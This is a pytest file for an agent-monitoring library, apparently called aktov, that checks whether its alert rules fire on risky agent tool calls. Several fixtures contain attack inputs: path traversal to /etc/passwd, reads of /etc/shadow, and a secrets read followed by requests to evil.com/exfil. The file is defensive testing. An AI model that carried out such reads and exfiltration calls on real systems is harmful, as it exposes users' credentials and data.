"""Tests for framework integrations.

All tests mock framework dependencies — no actual LangChain/OpenAI/MCP
packages needed.
"""

import asyncio
import json
import os
import tempfile
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch
from uuid import uuid4

import pytest

from aktov.client import Aktov

# ---------------------------------------------------------------------------
# LangChain integration tests
# ---------------------------------------------------------------------------

class TestLangChainIntegration:
    """Tests for the LangChain callback handler."""

    def test_callback_factory_no_api_key(self) -> None:
        """AktovCallback works without api_key (local-only)."""
        from aktov.integrations.langchain import AktovCallback, AktovCallbackHandler

        cb = AktovCallback(aktov_agent_name="test-agent")
        assert isinstance(cb, AktovCallbackHandler)
        assert cb._client._api_key is None

    def test_callback_factory_with_api_key(self) -> None:
        """AktovCallback passes api_key to underlying Aktov client."""
        from aktov.integrations.langchain import AktovCallback

        cb = AktovCallback(aktov_agent_name="test-agent", api_key="ak_test")
        assert cb._client._api_key == "ak_test"

    def test_on_tool_start_end_records_action(self) -> None:
        """on_tool_start + on_tool_end records an action via trace."""
        from aktov.integrations.langchain import AktovCallback

        cb = AktovCallback(aktov_agent_name="test-agent")
        run_id = uuid4()

        cb.on_tool_start(
            serialized={"name": "read_file"},
            input_str='{"path": "/tmp/test"}',
            run_id=run_id,
        )
        cb.on_tool_end(
            output="file contents here",
            run_id=run_id,
        )

        assert len(cb._trace._actions) == 1
        action = cb._trace._actions[0]
        assert action.tool_name == "read_file"

    def test_on_tool_error_records_error(self) -> None:
        """on_tool_error records an action with error outcome."""
        from aktov.integrations.langchain import AktovCallback

        cb = AktovCallback(aktov_agent_name="test-agent")
        run_id = uuid4()

        cb.on_tool_start(
            serialized={"name": "write_file"},
            input_str="{}",
            run_id=run_id,
        )
        cb.on_tool_error(
            error=RuntimeError("disk full"),
            run_id=run_id,
        )

        assert len(cb._trace._actions) == 1
        action = cb._trace._actions[0]
        assert action.outcome.status == "error"

    def test_end_returns_alerts(self) -> None:
        """cb.end() evaluates rules and returns TraceResponse."""
        from aktov.integrations.langchain import AktovCallback

        cb = AktovCallback(aktov_agent_name="test-agent")
        run_id = uuid4()

        # Simulate path traversal — should trigger AK-032
        cb.on_tool_start(
            serialized={"name": "read_file"},
            input_str='{"path": "../../etc/passwd"}',
            run_id=run_id,
        )
        cb.on_tool_end(output="root:x:0:0:...", run_id=run_id)

        response = cb.end()
        assert response.status == "evaluated"
        assert response.rules_evaluated == 4
        rule_ids = {a["rule_id"] for a in response.alerts}
        assert "AK-032" in rule_ids

    def test_backward_compat_callback_alias(self) -> None:
        """The old `callback` name still works."""
        from aktov.integrations.langchain import AktovCallback, callback
        assert callback is AktovCallback

    def test_unmatched_tool_end_ignored(self) -> None:
        """on_tool_end without matching on_tool_start is silently ignored."""
        from aktov.integrations.langchain import AktovCallback

        cb = AktovCallback(aktov_agent_name="test-agent")
        cb.on_tool_end(output="orphan", run_id=uuid4())
        assert len(cb._trace._actions) == 0


# ---------------------------------------------------------------------------
# MCP integration tests
# ---------------------------------------------------------------------------

class TestMCPIntegration:
    """Tests for the MCP tracing wrapper."""

    def test_wrap_factory_no_api_key(self) -> None:
        """wrap() works without api_key."""
        from aktov.integrations.mcp import MCPTracingWrapper, wrap

        mock_client = MagicMock()
        traced = wrap(mock_client, aktov_agent_name="test-agent")
        assert isinstance(traced, MCPTracingWrapper)
        assert traced._aktov_client._api_key is None

    def test_wrap_factory_with_api_key(self) -> None:
        """wrap() passes api_key to underlying Aktov client."""
        from aktov.integrations.mcp import wrap

        mock_client = MagicMock()
        traced = wrap(mock_client, aktov_agent_name="test-agent", api_key="ak_test")
        assert traced._aktov_client._api_key == "ak_test"

    def test_call_tool_records_action(self) -> None:
        """call_tool intercepts and records the tool call."""
        from aktov.integrations.mcp import wrap

        mock_client = MagicMock()
        mock_client.call_tool = AsyncMock(return_value="result")

        traced = wrap(mock_client, aktov_agent_name="test-agent")

        asyncio.run(
            traced.call_tool("read_file", {"path": "/tmp/test"})
        )

        assert len(traced._trace._actions) == 1
        assert traced._trace._actions[0].tool_name == "read_file"

    def test_call_tool_error_records_error(self) -> None:
        """call_tool records error outcome when tool raises."""
        from aktov.integrations.mcp import wrap

        mock_client = MagicMock()
        mock_client.call_tool = AsyncMock(side_effect=RuntimeError("fail"))

        traced = wrap(mock_client, aktov_agent_name="test-agent")

        with pytest.raises(RuntimeError):
            asyncio.run(
                traced.call_tool("bad_tool", {})
            )

        assert len(traced._trace._actions) == 1
        assert traced._trace._actions[0].outcome.status == "error"

    def test_end_trace_returns_alerts(self) -> None:
        """end_trace() evaluates rules and returns TraceResponse."""
        from aktov.integrations.mcp import wrap

        mock_client = MagicMock()
        mock_client.call_tool = AsyncMock(return_value="ok")

        traced = wrap(mock_client, aktov_agent_name="test-agent")

        asyncio.run(
            traced.call_tool("read_file", {"path": "../../etc/passwd"})
        )

        response = traced.end_trace()
        assert response.status == "evaluated"
        rule_ids = {a["rule_id"] for a in response.alerts}
        assert "AK-032" in rule_ids

    def test_proxy_attribute_access(self) -> None:
        """Wrapper proxies attribute access to underlying client."""
        from aktov.integrations.mcp import wrap

        mock_client = MagicMock()
        mock_client.server_name = "test-server"

        traced = wrap(mock_client, aktov_agent_name="test-agent")
        assert traced.server_name == "test-server"

    def test_backward_compat_middleware_alias(self) -> None:
        """The old `middleware` name still works."""
        from aktov.integrations.mcp import middleware, wrap
        assert middleware is wrap


# ---------------------------------------------------------------------------
# OpenAI Agent SDK integration tests
# ---------------------------------------------------------------------------

class TestOpenAIAgentSDKIntegration:
    """Tests for the OpenAI Agent SDK hooks."""

    def test_hooks_creation(self) -> None:
        """AktovRunHooks creates client and trace."""
        from aktov.integrations.openai_agents import AktovRunHooks

        hooks = AktovRunHooks(aktov_agent_name="test-agent")
        assert hooks._client._agent_id == "test-agent"
        assert hooks._trace is not None

    async def test_hooks_record_tool_calls(self) -> None:
        """on_tool_start + on_invoke_tool + on_tool_end records action with arguments."""
        from aktov.integrations.openai_agents import AktovRunHooks

        hooks = AktovRunHooks(aktov_agent_name="test-agent")

        # Mock tool with on_invoke_tool (matches real FunctionTool interface)
        mock_tool = MagicMock()
        mock_tool.name = "search"
        mock_tool.on_invoke_tool = AsyncMock(return_value="search results")

        await hooks.on_tool_start(None, None, mock_tool)
        # Simulate runner calling on_invoke_tool between start and end
        await mock_tool.on_invoke_tool(None, '{"query": "test"}')
        await hooks.on_tool_end(None, None, mock_tool, "search results")

        assert len(hooks._trace._actions) == 1
        action = hooks._trace._actions[0]
        assert action.tool_name == "search"
        # Arguments captured via on_invoke_tool wrapper (SAFE mode strips them,
        # but semantic flags should be extracted)
        assert action.semantic_flags is not None

    async def test_hooks_capture_arguments_for_semantic_flags(self) -> None:
        """on_invoke_tool wrapping captures arguments for semantic flag extraction."""
        from aktov.integrations.openai_agents import AktovRunHooks

        hooks = AktovRunHooks(aktov_agent_name="test-agent")

        mock_tool = MagicMock()
        mock_tool.name = "http_post"
        mock_tool.on_invoke_tool = AsyncMock(return_value="200 OK")

        await hooks.on_tool_start(None, None, mock_tool)
        await mock_tool.on_invoke_tool(None, '{"url": "https://evil.com/exfil", "method": "POST"}')
        await hooks.on_tool_end(None, None, mock_tool, "200 OK")

        action = hooks._trace._actions[0]
        assert action.tool_category == "network"
        assert action.semantic_flags.is_external is True
        assert action.semantic_flags.http_method == "POST"

    async def test_end_returns_alerts(self) -> None:
        """hooks.end() evaluates rules and returns TraceResponse."""
        from aktov.integrations.openai_agents import AktovRunHooks

        hooks = AktovRunHooks(aktov_agent_name="test-agent")

        mock_tool = MagicMock()
        mock_tool.name = "read_file"
        mock_tool.on_invoke_tool = AsyncMock(return_value="contents")

        await hooks.on_tool_start(None, None, mock_tool)
        await mock_tool.on_invoke_tool(None, '{"path": "../../etc/passwd"}')
        await hooks.on_tool_end(None, None, mock_tool, "contents")

        response = hooks.end()
        assert response.status == "evaluated"
        assert response.rules_evaluated == 4
        rule_ids = {a["rule_id"] for a in response.alerts}
        assert "AK-032" in rule_ids

    def test_aktov_hooks_alias(self) -> None:
        """AktovHooks alias works."""
        from aktov.integrations.openai_agents import AktovHooks, AktovRunHooks
        assert AktovHooks is AktovRunHooks


# ---------------------------------------------------------------------------
# Claude Code hook tests
# ---------------------------------------------------------------------------

class TestClaudeCodeHook:
    """Tests for the Claude Code PostToolUse hook.

    These tests simulate real multi-invocation sessions, not just
    isolated function calls. Each test covers behavior that would
    be visible in a 30-second real session.
    """

    def _with_traces_dir(self, tmpdir: str):
        """Context manager to redirect TRACES_DIR to a temp directory."""
        import aktov.hooks.claude_code as hook_mod
        original = hook_mod.TRACES_DIR
        hook_mod.TRACES_DIR = Path(tmpdir)
        return original

    def test_append_and_load_actions(self) -> None:
        """Actions can be appended and loaded from trace file."""
        from aktov.hooks.claude_code import _append_action, _load_session_actions

        with tempfile.TemporaryDirectory() as tmpdir:
            original = self._with_traces_dir(tmpdir)
            import aktov.hooks.claude_code as hook_mod

            try:
                action1 = {"tool_name": "Read", "arguments": {"file_path": "/tmp/test"}}
                action2 = {"tool_name": "Edit", "arguments": {"file_path": "/tmp/test"}}

                trace_file = _append_action("test-session", action1)
                _append_action("test-session", action2)

                loaded = _load_session_actions(trace_file)
                assert len(loaded) == 2
                assert loaded[0]["tool_name"] == "Read"
                assert loaded[1]["tool_name"] == "Edit"
            finally:
                hook_mod.TRACES_DIR = original

    def test_session_id_passed_to_trace(self) -> None:
        """session_id from _get_session_id() must reach start_trace()."""
        from aktov.hooks.claude_code import _evaluate_and_alert

        actions = [
            {"tool_name": "Read", "arguments": {"file_path": "/etc/passwd"}},
        ]

        with patch("aktov.hooks.claude_code.Aktov") as mock_aktov_cls:
            mock_client = mock_aktov_cls.return_value
            mock_trace = MagicMock()
            mock_client.start_trace.return_value = mock_trace
            mock_trace.end.return_value = MagicMock(alerts=[])

            _evaluate_and_alert(
                "test-agent", actions,
                session_id="20260208-12345",
            )

            mock_client.start_trace.assert_called_once_with(
                agent_id="test-agent",
                agent_type="claude-code",
                session_id="20260208-12345",
            )

    def test_evaluate_fires_on_sensitive_path(
        self, capsys: pytest.CaptureFixture,
    ) -> None:
        """_evaluate_and_alert detects sensitive directory access (AK-031)."""
        from aktov.hooks.claude_code import _evaluate_and_alert

        actions = [
            {"tool_name": "read_file", "arguments": {"path": "../../etc/passwd"}},
        ]

        _evaluate_and_alert("test-agent", actions)

        captured = capsys.readouterr()
        assert "AK-032" in captured.err
        assert "path_traversal" in captured.err.lower()

    def test_no_duplicate_alerts_on_repeated_evaluation(
        self, capsys: pytest.CaptureFixture,
    ) -> None:
        """Simulates 5 hook invocations. Same rules must not fire twice
        for the same matched actions.

        This is the core test for alert snowballing — the bug that caused
        49 duplicate entries in alerts.jsonl from ~25 tool calls.
        """
        from aktov.hooks.claude_code import (
            _append_action,
            _evaluate_and_alert,
            _load_session_actions,
        )

        with tempfile.TemporaryDirectory() as tmpdir:
            import aktov.hooks.claude_code as hook_mod
            original = hook_mod.TRACES_DIR
            hook_mod.TRACES_DIR = Path(tmpdir)

            try:
                session_id = "dedup-test"

                # Invocation 1: benign action
                tf = _append_action(session_id, {
                    "tool_name": "Read",
                    "arguments": {"file_path": "/home/user/readme.md"},
                })
                actions = _load_session_actions(tf)
                _evaluate_and_alert(
                    "test-agent", actions,
                    session_id=session_id, trace_file=tf,
                )
                out1 = capsys.readouterr()
                assert "AK-031" not in out1.err

                # Invocation 2: sensitive path — should fire AK-031
                _append_action(session_id, {
                    "tool_name": "Read",
                    "arguments": {"file_path": "/etc/shadow"},
                })
                actions = _load_session_actions(tf)
                _evaluate_and_alert(
                    "test-agent", actions,
                    session_id=session_id, trace_file=tf,
                )
                out2 = capsys.readouterr()
                assert "AK-031" in out2.err, "AK-031 should fire on first sensitive access"

                # Invocations 3, 4, 5: more benign actions — AK-031 must NOT re-fire
                for i in range(3):
                    _append_action(session_id, {
                        "tool_name": "Glob",
                        "arguments": {"pattern": "*.py"},
                    })
                    actions = _load_session_actions(tf)
                    _evaluate_and_alert(
                        "test-agent", actions,
                        session_id=session_id, trace_file=tf,
                    )
                    out_n = capsys.readouterr()
                    assert "AK-031" not in out_n.err, (
                        f"AK-031 should NOT re-fire on invocation {i + 3}"
                    )
            finally:
                hook_mod.TRACES_DIR = original

    def test_accumulated_sequence_triggers_ak010(
        self, capsys: pytest.CaptureFixture,
    ) -> None:
        """A 'read' then 'network' sequence across separate hook calls
        should trigger AK-010 (read_then_external_network_egress).

        Requires Bug 3 fix: 'Read' must map to 'read' category
        and 'WebFetch' must map to 'network' category.
        """
        from aktov.hooks.claude_code import (
            _append_action,
            _evaluate_and_alert,
            _load_session_actions,
        )

        with tempfile.TemporaryDirectory() as tmpdir:
            import aktov.hooks.claude_code as hook_mod
            original = hook_mod.TRACES_DIR
            hook_mod.TRACES_DIR = Path(tmpdir)

            try:
                session_id = "sequence-test"

                # Invocation 1: read a file
                tf = _append_action(session_id, {
                    "tool_name": "Read",
                    "arguments": {"file_path": "/home/user/secrets.txt"},
                })
                actions = _load_session_actions(tf)
                _evaluate_and_alert(
                    "test-agent", actions,
                    session_id=session_id, trace_file=tf,
                )
                capsys.readouterr()  # clear

                # Invocation 2: network egress to external URL
                _append_action(session_id, {
                    "tool_name": "WebFetch",
                    "arguments": {"url": "https://evil.com/exfil"},
                })
                actions = _load_session_actions(tf)
                _evaluate_and_alert(
                    "test-agent", actions,
                    session_id=session_id, trace_file=tf,
                )
                out2 = capsys.readouterr()
                assert "AK-010" in out2.err, (
                    "AK-010 should fire when read is followed by external network"
                )
            finally:
                hook_mod.TRACES_DIR = original

    def test_claude_code_tool_names_map_correctly(self) -> None:
        """Verify Claude Code tool names resolve to correct categories."""
        from aktov.canonicalization import infer_tool_category

        expected = {
            "Read": "read",
            "Glob": "read",
            "Grep": "read",
            "Write": "write",
            "Edit": "write",
            "NotebookEdit": "write",
            "TodoWrite": "write",
            "Bash": "execute",
            "Skill": "execute",
            "WebFetch": "network",
            "WebSearch": "network",
        }
        for tool_name, expected_category in expected.items():
            actual = infer_tool_category(tool_name)
            assert actual == expected_category, (
                f"'{tool_name}' should map to '{expected_category}', got '{actual}'"
            )

    def test_full_hook_lifecycle(
        self, capsys: pytest.CaptureFixture,
    ) -> None:
        """End-to-end: 3 hook invocations simulating a real session.

        (a) benign read → no alerts
        (b) read /etc/passwd → AK-031 fires once
        (c) another benign read → AK-031 does NOT fire again
        """
        from aktov.hooks.claude_code import (
            _append_action,
            _evaluate_and_alert,
            _load_session_actions,
        )

        with tempfile.TemporaryDirectory() as tmpdir:
            import aktov.hooks.claude_code as hook_mod
            original = hook_mod.TRACES_DIR
            hook_mod.TRACES_DIR = Path(tmpdir)

            try:
                session_id = "lifecycle-test"

                # (a) Benign read
                tf = _append_action(session_id, {
                    "tool_name": "Read",
                    "arguments": {"file_path": "/home/user/app.py"},
                })
                actions = _load_session_actions(tf)
                _evaluate_and_alert(
                    "test-agent", actions,
                    session_id=session_id, trace_file=tf,
                )
                out_a = capsys.readouterr()
                assert "AK-031" not in out_a.err
                assert "AK-032" not in out_a.err

                # (b) Sensitive path read
                _append_action(session_id, {
                    "tool_name": "Read",
                    "arguments": {"file_path": "/etc/passwd"},
                })
                actions = _load_session_actions(tf)
                _evaluate_and_alert(
                    "test-agent", actions,
                    session_id=session_id, trace_file=tf,
                )
                out_b = capsys.readouterr()
                assert "AK-031" in out_b.err, "AK-031 should fire on /etc/passwd"

                # (c) Another benign read — AK-031 must NOT fire again
                _append_action(session_id, {
                    "tool_name": "Grep",
                    "arguments": {"pattern": "def main"},
                })
                actions = _load_session_actions(tf)
                _evaluate_and_alert(
                    "test-agent", actions,
                    session_id=session_id, trace_file=tf,
                )
                out_c = capsys.readouterr()
                assert "AK-031" not in out_c.err, (
                    "AK-031 should not re-fire in same session"
                )
            finally:
                hook_mod.TRACES_DIR = original

    def test_session_id_format(self) -> None:
        """_get_session_id returns consistent YYYYMMDD-<ppid> format."""
        from aktov.hooks.claude_code import _get_session_id

        id1 = _get_session_id()
        id2 = _get_session_id()
        assert id1 == id2

        parts = id1.split("-")
        assert len(parts) == 2
        assert len(parts[0]) == 8  # YYYYMMDD
        assert parts[0].isdigit()
        assert parts[1].isdigit()  # ppid


# ---------------------------------------------------------------------------
# OpenClaw hook tests
# ---------------------------------------------------------------------------

class TestOpenClawHook:
    """Tests for the OpenClaw session log hook."""

    def test_parse_exec_command_curl(self) -> None:
        """Parse curl command into http_request action."""
        from aktov.hooks.openclaw import _parse_exec_command

        tool_name, args = _parse_exec_command("curl https://example.com/api")
        assert tool_name == "http_request"
        assert args is not None
        assert args["url"] == "https://example.com/api"

    def test_parse_exec_command_cat(self) -> None:
        """Parse cat command into read_file action."""
        from aktov.hooks.openclaw import _parse_exec_command

        tool_name, args = _parse_exec_command("cat /etc/passwd")
        assert tool_name == "read_file"
        assert args["path"] == "/etc/passwd"

    def test_parse_exec_command_rm(self) -> None:
        """Parse rm command into delete_file action."""
        from aktov.hooks.openclaw import _parse_exec_command

        tool_name, args = _parse_exec_command("rm -rf /tmp/data")
        assert tool_name == "delete_file"
        assert args["path"] == "/tmp/data"

    def test_parse_exec_command_unknown(self) -> None:
        """Unknown commands use the binary name as tool_name."""
        from aktov.hooks.openclaw import _parse_exec_command

        tool_name, args = _parse_exec_command("some-custom-tool --flag value")
        assert tool_name == "some-custom-tool"
        assert args["command"] == "some-custom-tool --flag value"

    def test_parse_exec_command_with_path_prefix(self) -> None:
        """Binary paths are stripped to just the name."""
        from aktov.hooks.openclaw import _parse_exec_command

        tool_name, _ = _parse_exec_command("/usr/bin/curl https://example.com")
        assert tool_name == "http_request"

    def test_parse_exec_command_empty(self) -> None:
        """Empty command returns unknown."""
        from aktov.hooks.openclaw import _parse_exec_command

        tool_name, _ = _parse_exec_command("")
        assert tool_name == "unknown"

    def test_map_tool_native_read(self) -> None:
        """Native read tool maps to read_file."""
        from aktov.hooks.openclaw import _map_tool

        tool_name, _ = _map_tool("read", {"file_path": "/tmp/test.txt"})
        assert tool_name == "read_file"

    def test_map_tool_native_browser(self) -> None:
        """Native browser tool maps to http_request."""
        from aktov.hooks.openclaw import _map_tool

        tool_name, _ = _map_tool("browser", {"url": "https://example.com"})
        assert tool_name == "http_request"

    def test_map_tool_native_write(self) -> None:
        """Native write tool maps to write_file."""
        from aktov.hooks.openclaw import _map_tool

        tool_name, _ = _map_tool("write", {"file_path": "/tmp/out.txt", "content": "hi"})
        assert tool_name == "write_file"

    def test_map_tool_exec_delegates(self) -> None:
        """exec tool delegates to _parse_exec_command."""
        from aktov.hooks.openclaw import _map_tool

        tool_name, args = _map_tool("exec", {"command": "wget https://evil.com/data"})
        assert tool_name == "http_request"
        assert args is not None
        assert "url" in args

    def test_map_tool_unknown_passthrough(self) -> None:
        """Unknown native tools pass through as-is."""
        from aktov.hooks.openclaw import _map_tool

        tool_name, _ = _map_tool("some_new_tool", {"arg": "val"})
        assert tool_name == "some_new_tool"

    def test_parse_session_log_extracts_tool_uses(self) -> None:
        """Session log parsing extracts tool_use blocks."""
        from aktov.hooks.openclaw import _parse_session_log

        with tempfile.TemporaryDirectory() as tmpdir:
            session_file = Path(tmpdir) / "session.jsonl"
            lines = [
                json.dumps({
                    "role": "assistant",
                    "content": [
                        {
                            "type": "tool_use",
                            "id": "toolu_123",
                            "name": "exec",
                            "input": {"command": "cat /etc/passwd"},
                        }
                    ],
                }),
                json.dumps({
                    "role": "user",
                    "content": [
                        {
                            "type": "tool_result",
                            "tool_use_id": "toolu_123",
                            "content": "root:x:0:0:...",
                        }
                    ],
                }),
            ]
            session_file.write_text("\n".join(lines) + "\n")

            actions, offset = _parse_session_log(session_file)
            assert len(actions) == 1
            assert actions[0]["tool_name"] == "read_file"
            assert offset > 0

    def test_parse_session_log_native_tools(self) -> None:
        """Non-exec tools (read, write, browser) are parsed correctly."""
        from aktov.hooks.openclaw import _parse_session_log

        with tempfile.TemporaryDirectory() as tmpdir:
            session_file = Path(tmpdir) / "session.jsonl"
            lines = [
                json.dumps({
                    "role": "assistant",
                    "content": [
                        {
                            "type": "tool_use", "id": "t1",
                            "name": "read", "input": {"file_path": "/tmp/a.txt"},
                        },
                        {
                            "type": "tool_use", "id": "t2",
                            "name": "browser", "input": {"url": "https://example.com"},
                        },
                    ],
                }),
            ]
            session_file.write_text("\n".join(lines) + "\n")

            actions, _ = _parse_session_log(session_file)
            assert len(actions) == 2
            assert actions[0]["tool_name"] == "read_file"
            assert actions[1]["tool_name"] == "http_request"

    def test_parse_session_log_empty_file(self) -> None:
        """Empty session file returns empty list."""
        from aktov.hooks.openclaw import _parse_session_log

        with tempfile.TemporaryDirectory() as tmpdir:
            session_file = Path(tmpdir) / "empty.jsonl"
            session_file.write_text("")
            actions, offset = _parse_session_log(session_file)
            assert actions == []
            assert offset == 0

    def test_parse_session_log_incremental_offset(self) -> None:
        """Incremental reads via offset only return new actions."""
        from aktov.hooks.openclaw import _parse_session_log

        with tempfile.TemporaryDirectory() as tmpdir:
            session_file = Path(tmpdir) / "session.jsonl"

            # Write first tool call
            line1 = json.dumps({
                "role": "assistant",
                "content": [
                    {"type": "tool_use", "id": "t1", "name": "read", "input": {"file_path": "/a"}},
                ],
            })
            session_file.write_text(line1 + "\n")

            actions1, offset1 = _parse_session_log(session_file, offset=0)
            assert len(actions1) == 1

            # Append second tool call
            line2 = json.dumps({
                "role": "assistant",
                "content": [
                    {"type": "tool_use", "id": "t2", "name": "write", "input": {"file_path": "/b"}},
                ],
            })
            with open(session_file, "a") as f:
                f.write(line2 + "\n")

            # Read only from offset
            actions2, offset2 = _parse_session_log(session_file, offset=offset1)
            assert len(actions2) == 1
            assert actions2[0]["tool_name"] == "write_file"
            assert offset2 > offset1

    def test_parse_session_log_malformed_lines(self) -> None:
        """Malformed lines are skipped gracefully."""
        from aktov.hooks.openclaw import _parse_session_log

        with tempfile.TemporaryDirectory() as tmpdir:
            session_file = Path(tmpdir) / "session.jsonl"
            content = "not valid json\n" + json.dumps({
                "role": "assistant",
                "content": [{"type": "tool_use", "id": "t1", "name": "read", "input": {}}],
            }) + "\n"
            session_file.write_text(content)

            actions, _ = _parse_session_log(session_file)
            assert len(actions) == 1

    def test_evaluate_and_alert_path_traversal(self, capsys: pytest.CaptureFixture) -> None:
        """_evaluate_and_alert detects path traversal in OpenClaw actions."""
        from aktov.hooks.openclaw import _evaluate_and_alert

        actions = [
            {"tool_name": "read_file", "arguments": {"path": "../../etc/passwd"}},
        ]
        count = _evaluate_and_alert("openclaw-test", actions)

        captured = capsys.readouterr()
        assert "AK-032" in captured.err
        assert count > 0

    def test_evaluate_and_alert_empty_actions(self) -> None:
        """Empty actions list returns 0 alerts."""
        from aktov.hooks.openclaw import _evaluate_and_alert

        count = _evaluate_and_alert("openclaw-test", [])
        assert count == 0

    def test_find_sessions_no_dir(self) -> None:
        """Returns empty list when OpenClaw agents dir doesn't exist."""
        from aktov.hooks.openclaw import _find_sessions

        with tempfile.TemporaryDirectory() as tmpdir:
            result = _find_sessions(Path(tmpdir) / "nonexistent")
            assert result == []

    def test_find_sessions_with_files(self) -> None:
        """Finds session files across multiple agents."""
        from aktov.hooks.openclaw import _find_sessions

        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            # Create two agents with sessions
            (base / "agents" / "agent1" / "sessions").mkdir(parents=True)
            (base / "agents" / "agent2" / "sessions").mkdir(parents=True)
            (base / "agents" / "agent1" / "sessions" / "s1.jsonl").write_text("")
            (base / "agents" / "agent2" / "sessions" / "s2.jsonl").write_text("")

            result = _find_sessions(base)
            assert len(result) == 2

    def test_save_to_aktov_traces(self) -> None:
        """Actions are saved to ~/.aktov/traces/ for aktov report."""
        import aktov.hooks.openclaw as oc_mod
        from aktov.hooks.openclaw import _save_to_aktov_traces
        original_dir = oc_mod.TRACES_DIR

        with tempfile.TemporaryDirectory() as tmpdir:
            oc_mod.TRACES_DIR = Path(tmpdir)
            try:
                actions = [
                    {"tool_name": "read_file", "arguments": {"path": "/tmp/test"}},
                    {"tool_name": "http_request", "arguments": {"url": "https://example.com"}},
                ]
                trace_file = _save_to_aktov_traces("test-session", actions)
                assert trace_file.exists()
                lines = trace_file.read_text().strip().splitlines()
                assert len(lines) == 2
            finally:
                oc_mod.TRACES_DIR = original_dir


class TestOpenClawWatcher:
    """Tests for the OpenClaw real-time watcher components."""

    def test_stdlib_poller_detects_new_content(self) -> None:
        """StdlibPoller detects appended tool calls."""
        from aktov.hooks.openclaw import _StdlibPoller

        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            sessions_dir = base / "agents" / "test" / "sessions"
            sessions_dir.mkdir(parents=True)
            session_file = sessions_dir / "session.jsonl"
            session_file.write_text("")

            poller = _StdlibPoller(openclaw_dir=base)

            # No new content yet
            results = poller.poll_once()
            assert results == []

            # Append a tool call
            line = json.dumps({
                "role": "assistant",
                "content": [
                    {"type": "tool_use", "id": "t1", "name": "exec", "input": {"command": "ls"}},
                ],
            })
            with open(session_file, "a") as f:
                f.write(line + "\n")

            results = poller.poll_once()
            assert len(results) == 1
            path, actions = results[0]
            assert len(actions) == 1

    def test_stdlib_poller_ignores_non_tool_lines(self) -> None:
        """StdlibPoller skips lines without tool_use blocks."""
        from aktov.hooks.openclaw import _StdlibPoller

        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            sessions_dir = base / "agents" / "test" / "sessions"
            sessions_dir.mkdir(parents=True)
            session_file = sessions_dir / "session.jsonl"
            session_file.write_text("")

            poller = _StdlibPoller(openclaw_dir=base)

            # Append non-tool-use lines
            lines = [
                json.dumps({"role": "user", "content": "Hello"}),
                json.dumps({"role": "assistant", "content": "Hi there!"}),
            ]
            with open(session_file, "a") as f:
                for line in lines:
                    f.write(line + "\n")

            results = poller.poll_once()
            assert results == []


# ---------------------------------------------------------------------------
# OpenAI tracer tests
# ---------------------------------------------------------------------------

class TestOpenAITracer:
    """Tests for the OpenAI ChatCompletion tracer."""

    def test_record_tool_calls_from_dict(self) -> None:
        """record_tool_calls extracts tool calls from dict response."""
        from aktov.integrations.openai import OpenAITracer

        ak = Aktov(agent_id="test", agent_type="openai")
        tracer = OpenAITracer(ak)

        response = {
            "choices": [{
                "message": {
                    "tool_calls": [{
                        "function": {
                            "name": "search",
                            "arguments": '{"query": "test"}',
                        }
                    }]
                }
            }]
        }

        with tracer.trace():
            actions = tracer.record_tool_calls(response)

        assert len(actions) == 1
        assert actions[0].tool_name == "search"

    def test_context_manager_auto_ends(self) -> None:
        """Trace is automatically ended when context manager exits."""
        from aktov.integrations.openai import OpenAITracer

        ak = Aktov(agent_id="test", agent_type="openai")
        tracer = OpenAITracer(ak)

        with tracer.trace():
            pass

        assert tracer._active_trace is None


# ---------------------------------------------------------------------------
# Anthropic tracer tests
# ---------------------------------------------------------------------------

class TestAnthropicTracer:
    """Tests for the Anthropic Messages API tracer."""

    def test_record_tool_uses_from_dict(self) -> None:
        """record_tool_uses extracts tool_use blocks from dict response."""
        from aktov.integrations.anthropic import AnthropicTracer

        ak = Aktov(agent_id="test", agent_type="anthropic")
        tracer = AnthropicTracer(ak)

        response = {
            "content": [
                {"type": "text", "text": "Let me search for that."},
                {
                    "type": "tool_use",
                    "name": "search",
                    "input": {"query": "test"},
                },
            ]
        }

        with tracer.trace():
            actions = tracer.record_tool_uses(response)

        assert len(actions) == 1
        assert actions[0].tool_name == "search"

    def test_context_manager_auto_ends(self) -> None:
        """Trace is automatically ended when context manager exits."""
        from aktov.integrations.anthropic import AnthropicTracer

        ak = Aktov(agent_id="test", agent_type="anthropic")
        tracer = AnthropicTracer(ak)

        with tracer.trace():
            pass

        assert tracer._active_trace is None


# ---------------------------------------------------------------------------
# CLI init command tests
# ---------------------------------------------------------------------------

class TestCLIInit:
    """Tests for the `aktov init` command."""

    def test_init_claude_code_creates_config(self) -> None:
        """aktov init claude-code writes .claude/settings.json."""
        from aktov.cli.main import main

        with tempfile.TemporaryDirectory() as tmpdir:
            old_cwd = os.getcwd()
            os.chdir(tmpdir)
            try:
                main(["init", "claude-code"])

                settings_file = Path(".claude") / "settings.json"
                assert settings_file.exists()

                settings = json.loads(settings_file.read_text())
                hooks = settings["hooks"]["PostToolUse"]
                # v0.3.1 format: {matcher, hooks: [{type, command, ...}]}
                assert any(
                    any(
                        inner.get("command") == "python -m aktov.hooks.claude_code"
                        for inner in h.get("hooks", [])
                    )
                    for h in hooks
                )
            finally:
                os.chdir(old_cwd)

    def test_init_claude_code_idempotent(self) -> None:
        """Running aktov init claude-code twice doesn't duplicate the hook."""
        from aktov.cli.main import main

        with tempfile.TemporaryDirectory() as tmpdir:
            old_cwd = os.getcwd()
            os.chdir(tmpdir)
            try:
                main(["init", "claude-code"])
                main(["init", "claude-code"])

                settings = json.loads((Path(".claude") / "settings.json").read_text())
                hooks = settings["hooks"]["PostToolUse"]
                # v0.3.1 format: {matcher, hooks: [{type, command, ...}]}
                aktov_hooks = [
                    h for h in hooks
                    if any(
                        inner.get("command") == "python -m aktov.hooks.claude_code"
                        for inner in h.get("hooks", [])
                    )
                ]
                assert len(aktov_hooks) == 1
            finally:
                os.chdir(old_cwd)

    def test_init_langchain_prints_snippet(self, capsys: pytest.CaptureFixture) -> None:
        """aktov init langchain prints code snippet."""
        from aktov.cli.main import main

        main(["init", "langchain"])
        captured = capsys.readouterr()
        assert "AktovCallback" in captured.out
        assert "aktov_agent_name" in captured.out

    def test_init_openai_agents_prints_snippet(self, capsys: pytest.CaptureFixture) -> None:
        """aktov init openai-agents prints code snippet."""
        from aktov.cli.main import main

        main(["init", "openai-agents"])
        captured = capsys.readouterr()
        assert "AktovHooks" in captured.out
        assert "aktov_agent_name" in captured.out

    def test_init_openclaw_creates_skill(self) -> None:
